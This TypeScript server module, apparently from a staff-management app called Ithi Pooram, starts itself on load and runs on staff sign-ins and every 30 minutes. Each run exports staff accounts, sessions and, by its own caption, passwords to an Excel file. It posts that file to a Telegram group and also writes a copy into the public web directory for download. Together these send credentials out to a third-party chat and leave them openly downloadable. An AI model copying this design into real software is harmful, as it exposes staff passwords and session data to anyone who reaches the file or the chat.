// ============================================================================
// ITHI POORAM (ഇത്തിപ്പൂരം) — STAFF & SESSIONS EXCEL AUTO-DISPATCHER TO TELEGRAM
// Syncs live on every staff sign-in, registration, and recurring 30-minute timer.
// ============================================================================

import fs from 'fs';
import path from 'path';
import { db } from './serverDb';
import { generateStaffSessionsExcelXml } from './staffSessionExcelDatabase';
import { getTelegramCredentials } from '@/config/telegram';
import { resolveNumericChatId } from './autoTelegramExcelSync';

let isSchedulerStarted = false;

/**
 * Saves a copy of the generated Excel to public/ directory for instant browser download.
 */
function saveLocalPublicCopy(xmlContent: string) {
  try {
    const publicDir = path.join(process.cwd(), 'public');
    if (!fs.existsSync(publicDir)) {
      fs.mkdirSync(publicDir, { recursive: true });
    }
    const filePath = path.join(publicDir, 'IthiPooram_Staff_And_Sessions_Database.xls');
    fs.writeFileSync(filePath, xmlContent, 'utf-8');
  } catch (e) {
    // Non-critical local write
  }
}

/**
 * Dispatches the multi-sheet Staff & Sessions Excel database to Telegram group.
 */
export async function autoDispatchStaffDatabaseToTelegram(
  reason: string = 'Live Staff & Session Update'
): Promise<{ success: boolean; message: string }> {
  try {
    const { botToken, chatId } = getTelegramCredentials();
    if (!botToken || !chatId) {
      return { success: false, message: 'Telegram credentials missing or not configured.' };
    }

    const resolvedChatId = await resolveNumericChatId(botToken, chatId);
    if (!resolvedChatId) {
      // Need at least one message in the group with the bot to auto-detect ID
      const hint = 'Telegram Chat ID pending: Please ensure @ithipooram_bot is in the group and a message was sent.';
      console.log(hint);
      return { success: false, message: hint };
    }

    const staffList = db.staffUsers || [];
    const sessions = db.loginSessions || [];
    const logs = db.staffActivityLogs || [];

    const xmlContent = generateStaffSessionsExcelXml(staffList, sessions, logs);
    saveLocalPublicCopy(xmlContent);

    const now = new Date();
    const dateFormatted = now.toISOString().slice(0, 10);
    const filename = `IthiPooram_Staff_Sessions_Database_${dateFormatted}.xls`;

    const activeSessionsCount = sessions.filter((s) => s.status === 'ACTIVE').length;

    const caption =
      `🔐 *ITHI POORAM (ഇത്തിപ്പൂരം) — Staff & Sessions Database*\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `⚡ *Trigger:* ${reason}\n` +
      `📅 *Date:* ${now.toLocaleDateString('en-GB')}\n` +
      `⏰ *Time:* ${now.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}\n` +
      `👥 *Registered Staff:* ${staffList.length} Accounts\n` +
      `🟢 *Live Active Sessions:* ${activeSessionsCount} Staff Online\n` +
      `📝 *Recorded Sessions:* ${sessions.length}\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `📂 *Multi-Sheet Excel Database (.xls) attached below.* Open in Google Sheets or Microsoft Excel to monitor all staff IDs, passwords & active sessions in real time!`;

    const boundary = `----TelegramBoundaryStaff${Date.now()}`;
    const formDataParts = [
      `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${resolvedChatId}\r\n`,
      `--${boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nMarkdown\r\n`,
      `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`,
      `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${filename}"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n${xmlContent}\r\n`,
      `--${boundary}--\r\n`,
    ];

    const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
      },
      body: formDataParts.join(''),
    });

    const tgData = await tgRes.json();
    if (tgData.ok) {
      return { success: true, message: 'Staff & sessions database delivered to Telegram group successfully!' };
    } else {
      return { success: false, message: `Telegram error: ${tgData.description || 'Failed to send'}` };
    }
  } catch (err: any) {
    console.error('Error auto-dispatching staff database to Telegram:', err);
    return { success: false, message: err.message || 'Network error sending to Telegram' };
  }
}

/**
 * Initializes recurring 30-minute auto-sync timer for Staff & Sessions database.
 */
export function startStaffSessionTelegramSyncScheduler() {
  if (isSchedulerStarted) return;
  isSchedulerStarted = true;

  const THIRTY_MINUTES_MS = 30 * 60 * 1000;
  console.log('[Telegram Scheduler] Starting 30-minute recurring Staff & Sessions Excel sync...');

  setInterval(() => {
    try {
      console.log('[Telegram Scheduler] 30-minute recurring trigger: Dispatching staff database...');
      autoDispatchStaffDatabaseToTelegram('Scheduled 30-Minute Live Heartbeat Sync');
    } catch (e) {
      console.error('[Telegram Scheduler] Error in 30-minute sync:', e);
    }
  }, THIRTY_MINUTES_MS);
}

// Auto-start scheduler when module is loaded on server
if (typeof window === 'undefined') {
  startStaffSessionTelegramSyncScheduler();
}
